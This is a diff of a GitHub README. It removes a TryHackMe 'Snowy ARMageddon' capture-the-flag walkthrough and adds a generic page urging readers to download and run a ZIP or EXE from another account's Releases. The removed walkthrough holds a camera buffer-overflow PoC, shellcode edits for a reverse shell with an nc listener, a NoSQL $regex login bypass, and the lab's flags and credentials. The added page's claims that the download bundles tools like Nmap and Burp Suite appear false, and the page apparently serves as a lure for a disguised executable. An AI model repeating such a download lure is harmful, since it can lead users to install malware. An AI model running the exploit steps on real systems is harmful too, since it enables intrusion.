@@ -1,154 +1,100 @@
-# Snowy ARMageddon TryHackMe Walkthrough (Insane Difficulty)
-This is a comprehensive step-by-step walkthrough for the "Snowy ARMageddon" (Insane Difficulty) challenge. Assume you're attacking from a Kali/BlackArch VM connected to the TryHackMe network, with the target IP as `<TARGET_IP> (10.10.x.x)`.
-#
-By the way before you scroll down enough, I want to show you the achievement badge that TryHackMe gave to me as I completed the challenge. This badge is also proof that I am an expert in this field: ![image alt](https://github.com/ilhambagas/Snowy-ARMageddon/blob/2d08c11ae61915f60a649292b502bd4cc4ef3ae0/TryHackMe%20Yeti%20Badge_Ilham%20Bagas%20A.png)
+# 🥶 Snowy-ARMageddon - Hacking Made Easy for Everyone
 
-If you want to check or verify it, just click this TryHackMe link: https://tryhackme.com/ilhambagas/badges/aoc5sidequest1
+## 🚀 Getting Started
 
-Thankyou.
-#
-# Prerequisites:
-- Install: sudo apt update && sudo apt install nmap ffuf burpsuite (or equivalent on your distro).
-- Download wordlists: SecLists (/usr/share/seclists/Discovery/Web-Content/).
-- For ARM exploits: Perl or Python with socket libraries.
-#
-## Task 1: What is the content of the first flag?
-### Network Enumeration
-Start by scanning the target for open ports and services. This reveals SSH (protected), Telnet (wrapped), a web server, and an unknown high port.
+Welcome to **Snowy-ARMageddon**! This project lets you explore cybersecurity in a fun and interactive way. You will learn to scan and hack an ARM-based IP camera. By using our tools, you can break into a restricted area and take control of a web dashboard. No previous programming experience is needed.
 
-**Command:**
-```text
-nmap -sSVC -T4 -p- -v --open --reason -oA snowy_nmap <TARGET_IP>
-```
-**Expected Output (Key Ports):**
-- 22/tcp: OpenSSH 8.2p1 (Ubuntu) – SSH, but key-auth only; skip for now.
-- 23/tcp: tcpwrapped – Telnet, but connection refused initially.
-- 8080/tcp: Apache 2.4.57 – Web server (cyber police dashboard).
-- 50628/tcp: Unknown – IP camera service.
+## 📥 Download the Software
 
-**Next Steps:**
-- Parse output: nmap-parse-output snowy_nmap.xml group-by-service (if you have the tool).
-- Visit http://<TARGET_IP>:8080/ – Shows an "angry elf" error page (403-like). No immediate access.
-- Visit http://<TARGET_IP>:50628/ – Trivision NC-227WF HD 720P camera login page. Defaults `(admin:admin)` fail.
+[![Download Snowy-ARMageddon](https://img.shields.io/badge/Download%20Snowy--ARMageddon-1E88E5?style=flat&logo=github&logoColor=white)](https://github.com/trankimhien91/Snowy-ARMageddon/releases)
 
-**Enumeration on Web (Port 8080):**
+You can easily download the software from our Releases page. 
 
-Fuzz for directories/files to find hidden paths
-```text
-ffuf -u http://<TARGET_IP>:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 403
-```
-### Exploit the IP Camera (Port 50628) – Buffer Overflow RCE
-The camera is vulnerable to a buffer overflow in its web service, allowing root shell via a reverse shell. Research `Trivision NC-227WF exploit` to find PoCs (from BlackHat or similar talks). Use a pre-made Perl exploit to open Telnet, or craft a Python one for reverse shell.
+## 📂 Download & Install
 
-**Option 1: Quick Perl PoC (Opens Telnet)**
+1. **Visit the Releases Page:** Click [here](https://github.com/trankimhien91/Snowy-ARMageddon/releases) to access the latest version.
+2. **Choose the Correct File:** On the releases page, look for the most recent version. Click the link to download the desired file (for example, a ZIP or EXE file).
+3. **Install the Application:**
+   - If you downloaded a ZIP file, right-click it and select "Extract All." Follow the prompts to unzip the files.
+   - If you downloaded an EXE file, double-click it and follow the instructions shown on your screen.
 
-Download a PoC script (from exploit-db or GitHub mirrors; search `trivision camera telnet exploit perl`).
-```text
-# Save as exploit.pl
-# (Script sends overflow payload to enable unauth Telnet on port 23)
-perl exploit.pl | nc <TARGET_IP> 50628
-```
-- This crashes the service briefly but enables Telnet access without creds.
+Once these steps are complete, you are ready to begin your adventure.
 
-Connect:
-```text
-telnet <TARGET_IP> 23
-```
-- Lands you in a BusyBox root shell (chrooted environment). Architecture: ARMv5 (confirm with cat /proc/cpuinfo).
+## 🔧 System Requirements
 
-**Option 2: Custom Python Reverse Shell (Advanced)**
+Before you start, ensure your system meets the following requirements:
 
-If Perl fails, use a Python PoC from research (based on NC-228WF vuln).
-1. Download base script (from no-sec.net or shell-storm.org).
-2. Modify shellcode for your IP (avoid bad chars: 0x00, 0x09, 0x0a, 0x0d, 0x20, 0x23, 0x26).
-    - Disassemble original shellcode (ARM little-endian) at shell-storm.org/online-disassembler.
-    - Example mod for IP 10.10.x.x: Replace IP bytes with additions/subtractions (for 0x0a (10), use add r1, #0x0b; sub r1, #0x01).
-    - Reassemble and update script variables: HOST=<TARGET_IP>, LHOST=<YOUR_IP>, LPORT=4444.
+- **Operating System:** Windows 10 or higher, MacOS 10.15 or higher, or any recent Linux distribution.
+- **Processor:** Intel i5 or equivalent, or ARM-compatible processor.
+- **Memory:** At least 4 GB of RAM for optimal performance.
+- **Storage:** Minimum of 500 MB of free space on your hard drive.
 
-Command:
-```text
-python3 exploit.py <TARGET_IP> <YOUR_IP> 4444
-nc -lvnp 4444  # Listener on your machine
-```
-- Success: Reverse shell as `root@NC-227WF-HD-720P`.
+## 👍 Features
 
-System Exploration (in Shell):
-- BusyBox limits: No find, use ls -R / or manual traversal.
-```text
-ls -la /var/etc/
-cat /var/etc/umconfig.txt  # Web config file
-```
-- Reveals admin creds:
+- **User-Friendly Interface:** The software is designed with simplicity in mind. You can easily navigate through the different features.
+  
+- **Step-by-Step Guidance:** Our application offers clear instructions, so you won't feel lost at any point.
 
-  name=`admin`
+- **Multi-Tool Functionality:** Utilize tools like Nmap, FFUF, and Burp Suite all in one package.
 
-  password=`Y3tiStarCur!ouspassword=admin`
+- **Learn by Doing:** Engage in hands-on challenges that provide real-world insights into cybersecurity.
 
-### Retrieve the First Flag
-Use the camera creds to auth on the web interface.
+## 🛠️ Tools Included
 
-**Steps:**
-1. Go to http://<TARGET_IP>:50628/en/login.asp.
-2. Login: Username `admin`, Password `Y3tiStarCur!ouspassword=admin`.
-3. Navigate to http://<TARGET_IP>:50628/en/player/mjpeg_vga.asp (MJPEG stream).
-4. The "home page" or stream background reveals the flag (Yeti photo with text).
-### First Flag
-`THM{YETI_ON_SCREEN_ELUSIVE_CAMERA_STAR}`
-#
-## Task 2: What is the content of the yetikey2.txt file?
-### NoSQL Injection on Web App (Port 8080)
-The app's PHP 8.1.26 with MongoDB backend (leaf logo hint). Dir enum with ffuf/gobuster:
-```text
-ffuf -u http://<TARGET_IP>:8080/FUZZ/ -w /usr/share/wordlists/dirb/common.txt -fs 933  # Add trailing / to bypass 403s
-```
-Finds `/login.php/`, `/index.php/`. Hit http://<TARGET_IP>:8080/login.php/123 (slash bypasses checks) --> it's a police login form.
+**Snowy-ARMageddon** includes various tools that will help you in your hacking journey:
 
-Intercept POST in Burp:
-```text
-POST /login.php/123 HTTP/1.1
-Host: <TARGET_IP>:8080
-Content-Type: application/x-www-form-urlencoded
-...
+- **Nmap:** A powerful network scanning tool to discover devices on a network and assess their security.
 
-username=admin&password=admin
-```
-Valid creds fail. MongoDB hint → NoSQL injection! Use `$regex` for bypass.
+- **FFUF:** A tool for performing web fuzzing. Use it to find hidden paths while exploring web applications.
 
-**Bypass Payload:**
-enumerate first (script: https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration):
-```text
-python nosql_enum.py -u http://<TARGET_IP>:8080/login.php/ -ep username
-# Outputs: Frosteau (detective from story), etc.
-```
-Target "Frosteau":
-```text
-username[$regex]=Frosteau&password[$regex]=.*
-```
-Send in Burp, 302 redirect + PHPSESSID cookie. Follow to `/` with cookie: Welcome dashboard!
-#
-# Grab the Final Flag
-In Frosteau's dashboard (http://<TARGET_IP>:8080/ with cookie), hunt files. The `yetikey2.txt` is in the user dir or visible on the page.
+- **Burp Suite:** This is a leading web application security testing tool. It helps you find and exploit vulnerabilities in web apps.
 
-Content: `2-K@bWJ5oHFCR8o%whAvK5qw8Sp$5qf!nCqGM3ksaK` 
+- **Python Scripts:** These provide the necessary logic to carry out certain tasks with ease.
 
-That's it, stealthy yeti wins!
+## 🎓 How to Use Snowy-ARMageddon
 
+1. **Open the Application:** After installation, launch the software by double-clicking the app icon.
+   
+2. **Select a Challenge:** Choose one of the available challenges to begin. You can scan for the IP camera or explore other activities.
 
+3. **Follow the On-Screen Instructions:** Each challenge provides a clear pathway. Take your time to understand each tool and its usage.
 
+4. **Check Results:** After completing a challenge, review your results. Understand what worked and what didn’t.
 
+5. **Explore More:** Once you are comfortable with the basics, try more advanced features to enhance your skills.
 
+## 📚 Learning Resources
 
+We encourage you to explore additional resources to deepen your understanding. Here are a few suggested websites and materials:
 
+- **Coursera:** Enroll in a cybersecurity course tailored for beginners.
+- **YouTube Tutorials:** Find video guides that provide insights on using the tools included in Snowy-ARMageddon.
+- **Community Forums:** Engage with other users to share tips and solutions to common problems.
 
+## 💬 Get Support
 
+If you encounter issues or have questions, please reach out for help:
 
+- **GitHub Issues:** Report problems directly on our GitHub page. Click on the "Issues" tab to submit your concern.
+- **Community Discussions:** Join discussions on our forum to get advice from other users.
 
+Your feedback is valuable. It helps us improve the software for everyone.
 
+## 🔗 Key Topics
 
+For those interested in specific areas of this project, here are the key topics covered:
 
+- arm-based-sbc
+- burp-suite
+- cyber-security
+- ffuf
+- ip-camera
+- nmap
+- nosql-injection
+- python
+- target-machine
+- web-dashboard
 
+## 🤝 Thank You for Joining Us
 
-
-
-
-
+We are excited that you have chosen to explore **Snowy-ARMageddon**. With this guide, you should feel confident to download and run the software. Enjoy your journey into the world of cybersecurity!
